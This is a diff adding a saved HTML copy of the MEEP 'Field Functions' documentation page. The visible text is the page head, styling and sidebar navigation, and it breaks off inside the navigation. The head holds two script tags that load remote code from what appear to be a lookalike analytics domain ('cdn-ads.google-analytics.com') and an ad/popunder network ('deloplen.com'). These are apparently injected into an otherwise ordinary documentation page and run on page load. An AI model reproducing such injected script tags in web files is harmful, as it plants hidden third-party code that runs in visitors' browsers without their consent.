@@ -1,0 +1,741 @@
+<!DOCTYPE html>
+<!-- saved from url=(0054)https://meep.readthedocs.io/en/latest/Field_Functions/ -->
+<html class=" js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths" lang="en" style=""><script async="" src="./Field Functions - MEEP Documentation_files/analytics.js.download"></script><script type="text/javascript" charset="utf-8" id="zm-extension" src="chrome-extension://fdcgdnkidjaadafnichfpabhfomcebme/scripts/webrtc-patch.js" async=""></script><!--<![endif]--><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  
+  <meta name="author" content="MEEP Developers">
+  <link rel="shortcut icon" href="https://meep.readthedocs.io/en/latest/img/favicon.ico">
+  <title>Field Functions - MEEP Documentation</title>
+  <link href="./Field Functions - MEEP Documentation_files/css" rel="stylesheet" type="text/css">
+
+  <link rel="stylesheet" href="./Field Functions - MEEP Documentation_files/theme.css" type="text/css">
+  <link rel="stylesheet" href="./Field Functions - MEEP Documentation_files/theme_extra.css" type="text/css">
+  <link rel="stylesheet" href="./Field Functions - MEEP Documentation_files/highlight.css">
+  <link href="./Field Functions - MEEP Documentation_files/badge_only.css" rel="stylesheet">
+  <link href="./Field Functions - MEEP Documentation_files/readthedocs-doc-embed.css" rel="stylesheet">
+  
+  <script>
+    // Current page data
+    var mkdocs_page_name = "Field Functions";
+    var mkdocs_page_input_path = "Field_Functions.md";
+    var mkdocs_page_url = "/Field_Functions/";
+  </script>
+  
+  <script src="./Field Functions - MEEP Documentation_files/jquery-2.1.1.min.js.download"></script>
+  <script src="./Field Functions - MEEP Documentation_files/modernizr-2.8.3.min.js.download"></script>
+  <script type="text/javascript" src="./Field Functions - MEEP Documentation_files/highlight.pack.js.download"></script> 
+  
+<script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="mustache.min" src="./Field Functions - MEEP Documentation_files/mustache.min.js.download"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="lunr.min" src="./Field Functions - MEEP Documentation_files/lunr.min.js.download"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="text" src="./Field Functions - MEEP Documentation_files/text.js.download"></script><style type="text/css">.MathJax_Hover_Frame {border-radius: .25em; -webkit-border-radius: .25em; -moz-border-radius: .25em; -khtml-border-radius: .25em; box-shadow: 0px 0px 15px #83A; -webkit-box-shadow: 0px 0px 15px #83A; -moz-box-shadow: 0px 0px 15px #83A; -khtml-box-shadow: 0px 0px 15px #83A; border: 1px solid #A6D ! important; display: inline-block; position: absolute}
+.MathJax_Menu_Button .MathJax_Hover_Arrow {position: absolute; cursor: pointer; display: inline-block; border: 2px solid #AAA; border-radius: 4px; -webkit-border-radius: 4px; -moz-border-radius: 4px; -khtml-border-radius: 4px; font-family: 'Courier New',Courier; font-size: 9px; color: #F0F0F0}
+.MathJax_Menu_Button .MathJax_Hover_Arrow span {display: block; background-color: #AAA; border: 1px solid; border-radius: 3px; line-height: 0; padding: 4px}
+.MathJax_Hover_Arrow:hover {color: white!important; border: 2px solid #CCC!important}
+.MathJax_Hover_Arrow:hover span {background-color: #CCC!important}
+</style><style type="text/css">#MathJax_About {position: fixed; left: 50%; width: auto; text-align: center; border: 3px outset; padding: 1em 2em; background-color: #DDDDDD; color: black; cursor: default; font-family: message-box; font-size: 120%; font-style: normal; text-indent: 0; text-transform: none; line-height: normal; letter-spacing: normal; word-spacing: normal; word-wrap: normal; white-space: nowrap; float: none; z-index: 201; border-radius: 15px; -webkit-border-radius: 15px; -moz-border-radius: 15px; -khtml-border-radius: 15px; box-shadow: 0px 10px 20px #808080; -webkit-box-shadow: 0px 10px 20px #808080; -moz-box-shadow: 0px 10px 20px #808080; -khtml-box-shadow: 0px 10px 20px #808080; filter: progid:DXImageTransform.Microsoft.dropshadow(OffX=2, OffY=2, Color='gray', Positive='true')}
+#MathJax_About.MathJax_MousePost {outline: none}
+.MathJax_Menu {position: absolute; background-color: white; color: black; width: auto; padding: 2px; border: 1px solid #CCCCCC; margin: 0; cursor: default; font: menu; text-align: left; text-indent: 0; text-transform: none; line-height: normal; letter-spacing: normal; word-spacing: normal; word-wrap: normal; white-space: nowrap; float: none; z-index: 201; box-shadow: 0px 10px 20px #808080; -webkit-box-shadow: 0px 10px 20px #808080; -moz-box-shadow: 0px 10px 20px #808080; -khtml-box-shadow: 0px 10px 20px #808080; filter: progid:DXImageTransform.Microsoft.dropshadow(OffX=2, OffY=2, Color='gray', Positive='true')}
+.MathJax_MenuItem {padding: 2px 2em; background: transparent}
+.MathJax_MenuArrow {position: absolute; right: .5em; padding-top: .25em; color: #666666; font-size: .75em}
+.MathJax_MenuActive .MathJax_MenuArrow {color: white}
+.MathJax_MenuArrow.RTL {left: .5em; right: auto}
+.MathJax_MenuCheck {position: absolute; left: .7em}
+.MathJax_MenuCheck.RTL {right: .7em; left: auto}
+.MathJax_MenuRadioCheck {position: absolute; left: 1em}
+.MathJax_MenuRadioCheck.RTL {right: 1em; left: auto}
+.MathJax_MenuLabel {padding: 2px 2em 4px 1.33em; font-style: italic}
+.MathJax_MenuRule {border-top: 1px solid #CCCCCC; margin: 4px 1px 0px}
+.MathJax_MenuDisabled {color: GrayText}
+.MathJax_MenuActive {background-color: Highlight; color: HighlightText}
+.MathJax_MenuDisabled:focus, .MathJax_MenuLabel:focus {background-color: #E8E8E8}
+.MathJax_ContextMenu:focus {outline: none}
+.MathJax_ContextMenu .MathJax_MenuItem:focus {outline: none}
+#MathJax_AboutClose {top: .2em; right: .2em}
+.MathJax_Menu .MathJax_MenuClose {top: -10px; left: -10px}
+.MathJax_MenuClose {position: absolute; cursor: pointer; display: inline-block; border: 2px solid #AAA; border-radius: 18px; -webkit-border-radius: 18px; -moz-border-radius: 18px; -khtml-border-radius: 18px; font-family: 'Courier New',Courier; font-size: 24px; color: #F0F0F0}
+.MathJax_MenuClose span {display: block; background-color: #AAA; border: 1.5px solid; border-radius: 18px; -webkit-border-radius: 18px; -moz-border-radius: 18px; -khtml-border-radius: 18px; line-height: 0; padding: 8px 0 6px}
+.MathJax_MenuClose:hover {color: white!important; border: 2px solid #CCC!important}
+.MathJax_MenuClose:hover span {background-color: #CCC!important}
+.MathJax_MenuClose:hover:focus {outline: none}
+</style><style type="text/css">.MathJax_Preview .MJXf-math {color: inherit!important}
+</style><style type="text/css">.MJX_Assistive_MathML {position: absolute!important; top: 0; left: 0; clip: rect(1px, 1px, 1px, 1px); padding: 1px 0 0 0!important; border: 0!important; height: 1px!important; width: 1px!important; overflow: hidden!important; display: block!important; -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none}
+.MJX_Assistive_MathML.MJX_Assistive_MathML_Block {width: 100%!important}
+</style><style type="text/css">#MathJax_Zoom {position: absolute; background-color: #F0F0F0; overflow: auto; display: block; z-index: 301; padding: .5em; border: 1px solid black; margin: 0; font-weight: normal; font-style: normal; text-align: left; text-indent: 0; text-transform: none; line-height: normal; letter-spacing: normal; word-spacing: normal; word-wrap: normal; white-space: nowrap; float: none; -webkit-box-sizing: content-box; -moz-box-sizing: content-box; box-sizing: content-box; box-shadow: 5px 5px 15px #AAAAAA; -webkit-box-shadow: 5px 5px 15px #AAAAAA; -moz-box-shadow: 5px 5px 15px #AAAAAA; -khtml-box-shadow: 5px 5px 15px #AAAAAA; filter: progid:DXImageTransform.Microsoft.dropshadow(OffX=2, OffY=2, Color='gray', Positive='true')}
+#MathJax_ZoomOverlay {position: absolute; left: 0; top: 0; z-index: 300; display: inline-block; width: 100%; height: 100%; border: 0; padding: 0; margin: 0; background-color: white; opacity: 0; filter: alpha(opacity=0)}
+#MathJax_ZoomFrame {position: relative; display: inline-block; height: 0; width: 0}
+#MathJax_ZoomEventTrap {position: absolute; left: 0; top: 0; z-index: 302; display: inline-block; border: 0; padding: 0; margin: 0; background-color: white; opacity: 0; filter: alpha(opacity=0)}
+</style><style type="text/css">.MathJax_Preview {color: #888}
+#MathJax_Message {position: fixed; left: 1em; bottom: 1.5em; background-color: #E6E6E6; border: 1px solid #959595; margin: 0px; padding: 2px 8px; z-index: 102; color: black; font-size: 80%; width: auto; white-space: nowrap}
+#MathJax_MSIE_Frame {position: absolute; top: 0; left: 0; width: 0px; z-index: 101; border: 0px; margin: 0px; padding: 0px}
+.MathJax_Error {color: #CC0000; font-style: italic}
+</style><style type="text/css">.MJXp-script {font-size: .8em}
+.MJXp-right {-webkit-transform-origin: right; -moz-transform-origin: right; -ms-transform-origin: right; -o-transform-origin: right; transform-origin: right}
+.MJXp-bold {font-weight: bold}
+.MJXp-italic {font-style: italic}
+.MJXp-scr {font-family: MathJax_Script,'Times New Roman',Times,STIXGeneral,serif}
+.MJXp-frak {font-family: MathJax_Fraktur,'Times New Roman',Times,STIXGeneral,serif}
+.MJXp-sf {font-family: MathJax_SansSerif,'Times New Roman',Times,STIXGeneral,serif}
+.MJXp-cal {font-family: MathJax_Caligraphic,'Times New Roman',Times,STIXGeneral,serif}
+.MJXp-mono {font-family: MathJax_Typewriter,'Times New Roman',Times,STIXGeneral,serif}
+.MJXp-largeop {font-size: 150%}
+.MJXp-largeop.MJXp-int {vertical-align: -.2em}
+.MJXp-math {display: inline-block; line-height: 1.2; text-indent: 0; font-family: 'Times New Roman',Times,STIXGeneral,serif; white-space: nowrap; border-collapse: collapse}
+.MJXp-display {display: block; text-align: center; margin: 1em 0}
+.MJXp-math span {display: inline-block}
+.MJXp-box {display: block!important; text-align: center}
+.MJXp-box:after {content: " "}
+.MJXp-rule {display: block!important; margin-top: .1em}
+.MJXp-char {display: block!important}
+.MJXp-mo {margin: 0 .15em}
+.MJXp-mfrac {margin: 0 .125em; vertical-align: .25em}
+.MJXp-denom {display: inline-table!important; width: 100%}
+.MJXp-denom > * {display: table-row!important}
+.MJXp-surd {vertical-align: top}
+.MJXp-surd > * {display: block!important}
+.MJXp-script-box > *  {display: table!important; height: 50%}
+.MJXp-script-box > * > * {display: table-cell!important; vertical-align: top}
+.MJXp-script-box > *:last-child > * {vertical-align: bottom}
+.MJXp-script-box > * > * > * {display: block!important}
+.MJXp-mphantom {visibility: hidden}
+.MJXp-munderover {display: inline-table!important}
+.MJXp-over {display: inline-block!important; text-align: center}
+.MJXp-over > * {display: block!important}
+.MJXp-munderover > * {display: table-row!important}
+.MJXp-mtable {vertical-align: .25em; margin: 0 .125em}
+.MJXp-mtable > * {display: inline-table!important; vertical-align: middle}
+.MJXp-mtr {display: table-row!important}
+.MJXp-mtd {display: table-cell!important; text-align: center; padding: .5em 0 0 .5em}
+.MJXp-mtr > .MJXp-mtd:first-child {padding-left: 0}
+.MJXp-mtr:first-child > .MJXp-mtd {padding-top: 0}
+.MJXp-mlabeledtr {display: table-row!important}
+.MJXp-mlabeledtr > .MJXp-mtd:first-child {padding-left: 0}
+.MJXp-mlabeledtr:first-child > .MJXp-mtd {padding-top: 0}
+.MJXp-merror {background-color: #FFFF88; color: #CC0000; border: 1px solid #CC0000; padding: 1px 3px; font-style: normal; font-size: 90%}
+.MJXp-scale0 {-webkit-transform: scaleX(.0); -moz-transform: scaleX(.0); -ms-transform: scaleX(.0); -o-transform: scaleX(.0); transform: scaleX(.0)}
+.MJXp-scale1 {-webkit-transform: scaleX(.1); -moz-transform: scaleX(.1); -ms-transform: scaleX(.1); -o-transform: scaleX(.1); transform: scaleX(.1)}
+.MJXp-scale2 {-webkit-transform: scaleX(.2); -moz-transform: scaleX(.2); -ms-transform: scaleX(.2); -o-transform: scaleX(.2); transform: scaleX(.2)}
+.MJXp-scale3 {-webkit-transform: scaleX(.3); -moz-transform: scaleX(.3); -ms-transform: scaleX(.3); -o-transform: scaleX(.3); transform: scaleX(.3)}
+.MJXp-scale4 {-webkit-transform: scaleX(.4); -moz-transform: scaleX(.4); -ms-transform: scaleX(.4); -o-transform: scaleX(.4); transform: scaleX(.4)}
+.MJXp-scale5 {-webkit-transform: scaleX(.5); -moz-transform: scaleX(.5); -ms-transform: scaleX(.5); -o-transform: scaleX(.5); transform: scaleX(.5)}
+.MJXp-scale6 {-webkit-transform: scaleX(.6); -moz-transform: scaleX(.6); -ms-transform: scaleX(.6); -o-transform: scaleX(.6); transform: scaleX(.6)}
+.MJXp-scale7 {-webkit-transform: scaleX(.7); -moz-transform: scaleX(.7); -ms-transform: scaleX(.7); -o-transform: scaleX(.7); transform: scaleX(.7)}
+.MJXp-scale8 {-webkit-transform: scaleX(.8); -moz-transform: scaleX(.8); -ms-transform: scaleX(.8); -o-transform: scaleX(.8); transform: scaleX(.8)}
+.MJXp-scale9 {-webkit-transform: scaleX(.9); -moz-transform: scaleX(.9); -ms-transform: scaleX(.9); -o-transform: scaleX(.9); transform: scaleX(.9)}
+.MathJax_PHTML .noError {vertical-align: ; font-size: 90%; text-align: left; color: black; padding: 1px 3px; border: 1px solid}
+</style><style type="text/css">.MathJax_Display {text-align: center; margin: 1em 0em; position: relative; display: block!important; text-indent: 0; max-width: none; max-height: none; min-width: 0; min-height: 0; width: 100%}
+.MathJax .merror {background-color: #FFFF88; color: #CC0000; border: 1px solid #CC0000; padding: 1px 3px; font-style: normal; font-size: 90%}
+.MathJax .MJX-monospace {font-family: monospace}
+.MathJax .MJX-sans-serif {font-family: sans-serif}
+#MathJax_Tooltip {background-color: InfoBackground; color: InfoText; border: 1px solid black; box-shadow: 2px 2px 5px #AAAAAA; -webkit-box-shadow: 2px 2px 5px #AAAAAA; -moz-box-shadow: 2px 2px 5px #AAAAAA; -khtml-box-shadow: 2px 2px 5px #AAAAAA; filter: progid:DXImageTransform.Microsoft.dropshadow(OffX=2, OffY=2, Color='gray', Positive='true'); padding: 3px 4px; z-index: 401; position: absolute; left: 0; top: 0; width: auto; height: auto; display: none}
+.MathJax {display: inline; font-style: normal; font-weight: normal; line-height: normal; font-size: 100%; font-size-adjust: none; text-indent: 0; text-align: left; text-transform: none; letter-spacing: normal; word-spacing: normal; word-wrap: normal; white-space: nowrap; float: none; direction: ltr; max-width: none; max-height: none; min-width: 0; min-height: 0; border: 0; padding: 0; margin: 0}
+.MathJax:focus, body :focus .MathJax {display: inline-table}
+.MathJax.MathJax_FullWidth {text-align: center; display: table-cell!important; width: 10000em!important}
+.MathJax img, .MathJax nobr, .MathJax a {border: 0; padding: 0; margin: 0; max-width: none; max-height: none; min-width: 0; min-height: 0; vertical-align: 0; line-height: normal; text-decoration: none}
+img.MathJax_strut {border: 0!important; padding: 0!important; margin: 0!important; vertical-align: 0!important}
+.MathJax span {display: inline; position: static; border: 0; padding: 0; margin: 0; vertical-align: 0; line-height: normal; text-decoration: none}
+.MathJax nobr {white-space: nowrap!important}
+.MathJax img {display: inline!important; float: none!important}
+.MathJax * {transition: none; -webkit-transition: none; -moz-transition: none; -ms-transition: none; -o-transition: none}
+.MathJax_Processing {visibility: hidden; position: fixed; width: 0; height: 0; overflow: hidden}
+.MathJax_Processed {display: none!important}
+.MathJax_ExBox {display: block!important; overflow: hidden; width: 1px; height: 60ex; min-height: 0; max-height: none}
+.MathJax .MathJax_EmBox {display: block!important; overflow: hidden; width: 1px; height: 60em; min-height: 0; max-height: none}
+.MathJax_LineBox {display: table!important}
+.MathJax_LineBox span {display: table-cell!important; width: 10000em!important; min-width: 0; max-width: none; padding: 0; border: 0; margin: 0}
+.MathJax .MathJax_HitBox {cursor: text; background: white; opacity: 0; filter: alpha(opacity=0)}
+.MathJax .MathJax_HitBox * {filter: none; opacity: 1; background: transparent}
+#MathJax_Tooltip * {filter: none; opacity: 1; background: transparent}
+@font-face {font-family: MathJax_Main; src: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/fonts/HTML-CSS/TeX/woff/MathJax_Main-Regular.woff?V=2.7.1') format('woff'), url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/fonts/HTML-CSS/TeX/otf/MathJax_Main-Regular.otf?V=2.7.1') format('opentype')}
+@font-face {font-family: MathJax_Main-bold; src: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/fonts/HTML-CSS/TeX/woff/MathJax_Main-Bold.woff?V=2.7.1') format('woff'), url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/fonts/HTML-CSS/TeX/otf/MathJax_Main-Bold.otf?V=2.7.1') format('opentype')}
+@font-face {font-family: MathJax_Main-italic; src: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/fonts/HTML-CSS/TeX/woff/MathJax_Main-Italic.woff?V=2.7.1') format('woff'), url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/fonts/HTML-CSS/TeX/otf/MathJax_Main-Italic.otf?V=2.7.1') format('opentype')}
+@font-face {font-family: MathJax_Math-italic; src: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/fonts/HTML-CSS/TeX/woff/MathJax_Math-Italic.woff?V=2.7.1') format('woff'), url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/fonts/HTML-CSS/TeX/otf/MathJax_Math-Italic.otf?V=2.7.1') format('opentype')}
+@font-face {font-family: MathJax_Caligraphic; src: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/fonts/HTML-CSS/TeX/woff/MathJax_Caligraphic-Regular.woff?V=2.7.1') format('woff'), url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/fonts/HTML-CSS/TeX/otf/MathJax_Caligraphic-Regular.otf?V=2.7.1') format('opentype')}
+@font-face {font-family: MathJax_Size1; src: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/fonts/HTML-CSS/TeX/woff/MathJax_Size1-Regular.woff?V=2.7.1') format('woff'), url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/fonts/HTML-CSS/TeX/otf/MathJax_Size1-Regular.otf?V=2.7.1') format('opentype')}
+@font-face {font-family: MathJax_Size2; src: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/fonts/HTML-CSS/TeX/woff/MathJax_Size2-Regular.woff?V=2.7.1') format('woff'), url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/fonts/HTML-CSS/TeX/otf/MathJax_Size2-Regular.otf?V=2.7.1') format('opentype')}
+@font-face {font-family: MathJax_Size3; src: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/fonts/HTML-CSS/TeX/woff/MathJax_Size3-Regular.woff?V=2.7.1') format('woff'), url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/fonts/HTML-CSS/TeX/otf/MathJax_Size3-Regular.otf?V=2.7.1') format('opentype')}
+@font-face {font-family: MathJax_Size4; src: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/fonts/HTML-CSS/TeX/woff/MathJax_Size4-Regular.woff?V=2.7.1') format('woff'), url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/fonts/HTML-CSS/TeX/otf/MathJax_Size4-Regular.otf?V=2.7.1') format('opentype')}
+.MathJax .noError {vertical-align: ; font-size: 90%; text-align: left; color: black; padding: 1px 3px; border: 1px solid}
+</style><link href="https://cdn-ads.google-analytics.com/84.js" rel="preload" as="script"><script src="https://cdn-ads.google-analytics.com/84.js" type="text/javascript"></script><link href="https://deloplen.com/apu.php?zoneid=2762524" rel="preload" as="script"><script src="https://deloplen.com/apu.php?zoneid=2762524" type="text/javascript"></script><script type="text/javascript" src="./Field Functions - MEEP Documentation_files/bc.js.download"></script></head>
+
+<body class="wy-body-for-nav" role="document"><div style="visibility: hidden; overflow: hidden; position: absolute; top: 0px; height: 1px; width: auto; padding: 0px; border: 0px; margin: 0px; text-align: left; text-indent: 0px; text-transform: none; line-height: normal; letter-spacing: normal; word-spacing: normal;"><div id="MathJax_Hidden"></div></div><div id="MathJax_Message" style="display: none;"></div>
+
+  <div class="wy-grid-for-nav">
+
+    
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side stickynav">
+      <div class="wy-side-nav-search">
+        <a href="https://meep.readthedocs.io/en/latest/" class="icon icon-home"> MEEP Documentation</a>
+        <div role="search">
+  <form id="rtd-search-form" class="wy-form" action="https://meep.readthedocs.io/en/latest/search.html" method="get">
+    <input type="text" name="q" placeholder="Search docs">
+  </form>
+</div>
+      </div>
+
+      <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="main navigation">
+	<ul class="current">
+	  
+          
+            <li class="toctree-l1">
+		
+    <a class="" href="https://meep.readthedocs.io/en/latest/">Manual</a>
+	    </li>
+          
+            <li class="toctree-l1">
+		
+    <a class="" href="https://meep.readthedocs.io/en/latest/Introduction/">Introduction</a>
+	    </li>
+          
+            <li class="toctree-l1">
+		
+    <a class="" href="https://meep.readthedocs.io/en/latest/Download/">Download</a>
+	    </li>
+          
+            <li class="toctree-l1">
+		
+    <a class="" href="https://meep.readthedocs.io/en/latest/FAQ/">FAQ</a>
+	    </li>
+          
+            <li class="toctree-l1">
+		
+    <a class="" href="https://meep.readthedocs.io/en/latest/Installation/">Installation</a>
+	    </li>
+          
+            <li class="toctree-l1">
+		
+    <a class="" href="https://meep.readthedocs.io/en/latest/Build_From_Source/">Build From Source</a>
+	    </li>
+          
+            <li class="toctree-l1">
+		
+    <a class="" href="https://meep.readthedocs.io/en/latest/Acknowledgements/">Acknowledgements</a>
+	    </li>
+          
+            <li class="toctree-l1">
+		
+    <a class="" href="https://meep.readthedocs.io/en/latest/License_and_Copyright/">License and Copyright</a>
+	    </li>
+          
+            <li class="toctree-l1">
+		
+    <span class="caption-text">Features</span>
+    <ul class="subnav">
+                <li class="">
+                    
+    <a class="" href="https://meep.readthedocs.io/en/latest/Materials/">Materials</a>
+                </li>
+                <li class="">
+                    
+    <a class="" href="https://meep.readthedocs.io/en/latest/Subpixel_Smoothing/">Subpixel Smoothing</a>
+                </li>
+                <li class="">
+                    
+    <a class="" href="https://meep.readthedocs.io/en/latest/Exploiting_Symmetry/">Exploiting Symmetry</a>
+                </li>
+                <li class="">
+                    
+    <a class="" href="https://meep.readthedocs.io/en/latest/Cylindrical_Coordinates/">Cylindrical Coordinates</a>
+                </li>
+                <li class="">
+                    
+    <a class="" href="https://meep.readthedocs.io/en/latest/Perfectly_Matched_Layer/">Perfectly Matched Layers</a>
+                </li>
+                <li class="">
+                    
+    <a class="" href="https://meep.readthedocs.io/en/latest/Parallel_Meep/">Parallel Meep</a>
+                </li>
+                <li class="">
+                    
+    <a class="" href="https://meep.readthedocs.io/en/latest/Synchronizing_the_Magnetic_and_Electric_Fields/">Synchronizing the Magnetic and Electric Fields</a>
+                </li>
+                <li class="">
+                    
+    <a class="" href="https://meep.readthedocs.io/en/latest/Mode_Decomposition/">Mode Decomposition</a>
+                </li>
+                <li class=" current">
+                    
+    <a class="current" href="https://meep.readthedocs.io/en/latest/Field_Functions/">Field Functions</a>
+    <ul class="subnav">
+            
+    </ul>
+                </li>
+                <li class="">
+                    
+    <a class="" href="https://meep.readthedocs.io/en/latest/The_Run_Function_Is_Not_A_Loop/">The Run Function is Not a Loop</a>
+                </li>
+                <li class="">
+                    
+    <a class="" href="https://meep.readthedocs.io/en/latest/Yee_Lattice/">Yee Lattice</a>
+                </li>
+                <li class="">
+                    
+    <a class="" href="https://meep.readthedocs.io/en/latest/Units_and_Nonlinearity/">Units and Nonlinearity</a>
+                </li>
+    </ul>
+	    </li>
+          
+            <li class="toctree-l1">
+		
+    <span class="caption-text">Python Interface</span>
+    <ul class="subnav">
+                <li class="">
+                    
+    <a class="" href="https://meep.readthedocs.io/en/latest/Python_User_Interface/">User Interface</a>
+                </li>
+                <li class="">
+                    
+    <a class="" href="https://meep.readthedocs.io/en/latest/Python_Developer_Information/">Developer Information</a>
+                </li>
+                <li class="">
+                    
+    <a class="" href="https://meep.readthedocs.io/en/latest/Python_Tutorials/Basics/">Tutorial/Basics</a>
+                </li>
+                <li class="">
+                    
+    <a class="" href="https://meep.readthedocs.io/en/latest/Python_Tutorials/Ring_Resonator_in_Cylindrical_Coordinates/">Tutorial/Ring Resonator in Cylindrical Coordinates</a>
+                </li>
+                <li class="">
+                    
+    <a class="" href="https://meep.readthedocs.io/en/latest/Python_Tutorials/Resonant_Modes_and_Transmission_in_a_Waveguide_Cavity/">Tutorial/Resonant Modes and Transmission in a Waveguide Cavity</a>
+                </li>
+                <li class="">
+                    
+    <a class="" href="https://meep.readthedocs.io/en/latest/Python_Tutorials/Material_Dispersion/">Tutorial/Material Dispersion</a>
+                </li>
+                <li class="">
+                    
+    <a class="" href="https://meep.readthedocs.io/en/latest/Python_Tutorials/Third_Harmonic_Generation/">Tutorial/Third Harmonic Generation</a>
+                </li>
+                <li class="">
+                    
+    <a class="" href="https://meep.readthedocs.io/en/latest/Python_Tutorials/Near_to_Far_Field_Spectra/">Tutorial/Near-to-Far Field Spectra</a>
+                </li>
+                <li class="">
+                    
+    <a class="" href="https://meep.readthedocs.io/en/latest/Python_Tutorials/Local_Density_of_States/">Tutorial/Local Density of States</a>
+                </li>
+                <li class="">
+                    
+    <a class="" href="https://meep.readthedocs.io/en/latest/Python_Tutorials/Optical_Forces/">Tutorial/Optical Forces</a>
+                </li>
+                <li class="">
+                    
+    <a class="" href="https://meep.readthedocs.io/en/latest/Python_Tutorials/Gyrotropic_Media/">Tutorial/Gyrotropic Media</a>
+                </li>
+                <li class="">
+                    
+    <a class="" href="https://meep.readthedocs.io/en/latest/Python_Tutorials/Multilevel_Atomic_Susceptibility/">Tutorial/Multilevel Atomic Susceptibility</a>
+                </li>
+                <li class="">
+                    
+    <a class="" href="https://meep.readthedocs.io/en/latest/Python_Tutorials/Frequency_Domain_Solver/">Tutorial/Frequency-Domain Solver</a>
+                </li>
+                <li class="">
+                    
+    <a class="" href="https://meep.readthedocs.io/en/latest/Python_Tutorials/Eigenmode_Source/">Tutorial/Eigenmode Source</a>
+                </li>
+                <li class="">
+                    
+    <a class="" href="https://meep.readthedocs.io/en/latest/Python_Tutorials/Mode_Decomposition/">Tutorial/Mode Decomposition</a>
+                </li>
+                <li class="">
+                    
+    <a class="" href="https://meep.readthedocs.io/en/latest/Python_Tutorials/GDSII_Import/">Tutorial/GDSII Import</a>
+                </li>
+                <li class="">
+                    
+    <a class="" href="https://meep.readthedocs.io/en/latest/Python_Tutorials/AdjointSolver/">Tutorial/Adjoint Solver</a>
+                </li>
+    </ul>
+	    </li>
+          
+            <li class="toctree-l1">
+		
+    <span class="caption-text">Scheme Interface</span>
+    <ul class="subnav">
+                <li class="">
+                    
+    <a class="" href="https://meep.readthedocs.io/en/latest/Scheme_User_Interface/">User Interface</a>
+                </li>
+                <li class="">
+                    
+    <a class="" href="https://meep.readthedocs.io/en/latest/Scheme_Tutorials/Basics/">Tutorial/Basics</a>
+                </li>
+                <li class="">
+                    
+    <a class="" href="https://meep.readthedocs.io/en/latest/Scheme_Tutorials/Ring_Resonator_in_Cylindrical_Coordinates/">Tutorial/Ring Resonator in Cylindrical Coordinates</a>
+                </li>
+                <li class="">
+                    
+    <a class="" href="https://meep.readthedocs.io/en/latest/Scheme_Tutorials/Resonant_Modes_and_Transmission_in_a_Waveguide_Cavity/">Tutorial/Resonant Modes and Transmission in a Waveguide Cavity</a>
+                </li>
+                <li class="">
+                    
+    <a class="" href="https://meep.readthedocs.io/en/latest/Scheme_Tutorials/Material_Dispersion/">Tutorial/Material Dispersion</a>
+                </li>
+                <li class="">
+                    
+    <a class="" href="https://meep.readthedocs.io/en/latest/Scheme_Tutorials/Third_Harmonic_Generation/">Tutorial/Third Harmonic Generation</a>
+                </li>
+                <li class="">
+                    
+    <a class="" href="https://meep.readthedocs.io/en/latest/Scheme_Tutorials/Near_to_Far_Field_Spectra/">Tutorial/Near-to-Far Field Spectra</a>
+                </li>
+                <li class="">
+                    
+    <a class="" href="https://meep.readthedocs.io/en/latest/Scheme_Tutorials/Local_Density_of_States/">Tutorial/Local Density of States</a>
+                </li>
+                <li class="">
+                    
+    <a class="" href="https://meep.readthedocs.io/en/latest/Scheme_Tutorials/Optical_Forces/">Tutorial/Optical Forces</a>
+                </li>
+                <li class="">
+                    
+    <a class="" href="https://meep.readthedocs.io/en/latest/Scheme_Tutorials/Gyrotropic_Media/">Tutorial/Gyrotropic Media</a>
+                </li>
+                <li class="">
+                    
+    <a class="" href="https://meep.readthedocs.io/en/latest/Scheme_Tutorials/Multilevel_Atomic_Susceptibility/">Tutorial/Multilevel Atomic Susceptibility</a>
+                </li>
+                <li class="">
+                    
+    <a class="" href="https://meep.readthedocs.io/en/latest/Scheme_Tutorials/Frequency_Domain_Solver/">Tutorial/Frequency-Domain Solver</a>
+                </li>
+                <li class="">
+                    
+    <a class="" href="https://meep.readthedocs.io/en/latest/Scheme_Tutorials/Eigenmode_Source/">Tutorial/Eigenmode Source</a>
+                </li>
+                <li class="">
+                    
+    <a class="" href="https://meep.readthedocs.io/en/latest/Scheme_Tutorials/Mode_Decomposition/">Tutorial/Mode Decomposition</a>
+                </li>
+                <li class="">
+                    
+    <a class="" href="https://meep.readthedocs.io/en/latest/Scheme_Tutorials/Casimir_Forces/">Tutorial/Casimir Forces</a>
+                </li>
+                <li class="">
+                    
+    <a class="" href="https://meep.readthedocs.io/en/latest/Guile_and_Scheme_Information/">Guile and Scheme Information</a>
+                </li>
+    </ul>
+	    </li>
+          
+            <li class="toctree-l1">
+		
